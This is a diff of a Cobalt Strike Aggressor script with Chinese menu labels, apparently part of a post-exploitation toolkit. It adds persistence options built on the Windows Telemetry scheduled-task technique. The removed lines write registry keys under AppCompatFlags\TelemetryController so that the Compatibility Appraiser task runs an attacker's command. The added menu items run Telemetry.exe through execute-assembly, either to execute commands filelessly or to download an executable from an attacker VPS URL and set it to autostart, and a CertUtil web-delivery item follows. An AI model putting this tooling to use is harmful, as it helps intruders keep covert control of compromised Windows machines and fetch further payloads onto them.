@@ -7,15 +7,40 @@
 #                            #
 #                            #
 ##############################
-menu "获取权限" {
-			    item "\"遥测\"计划任务" {
-             prompt_text("文件路径", "", lambda({
-            bshell(@ids, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\Microsoft\" /v Command /t reg_sz /d $1");
-			bshell(@ids, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\Microsoft\" /v Nightly /t reg_dword /d 1");
-			bshell(@ids, "schtasks /run /tn \"\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser\"");
-        }, @ids => $1));
-    }
-	item "CertUtil Web 传递" {
+menu "权限维持" {
+
+	    menu "\"遥测\"计划任务" {
+					item "无文件执行命令" {
+			$bid = $1['@'];
+			$dialog = dialog("Telemetry", %(command => "",bid => $bid), &Telemetry_cmd);
+			dialog_description($dialog, "输入cmd命令，cmd /s 后面的内容，执行方式：Telemetry.exe install /command:calc");
+			drow_text($dialog, "command", "command:  ");	
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub Telemetry_cmd {
+		$arg = join('', @("install /command:",$3['command']));
+		bexecute_assembly($bid, script_resource("/script/Telemetry.exe"), $arg);
+}
+
+					item "远程下载文件自启" {
+			$bid = $1['@'];
+			$dialog = dialog("Telemetry", %(url => "",bid => $bid), &Telemetry_url);
+			dialog_description($dialog, "输入exe下载地址，执行方式：Telemetry.exe install /url:http://vps:8089/System.exe");
+			drow_text($dialog, "url", "url:  ");	
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub Telemetry_url {
+		$arg = join('', @("install /url:",$3['url']));
+		bexecute_assembly($bid, script_resource("/script/Telemetry.exe"), $arg);
+}
+		
+		}
+			
+
+
+	item "CertUtil Web Delivery" {
 		local('$dialog %defaults');
 
 		%defaults["uri"]  = "/test.dll";
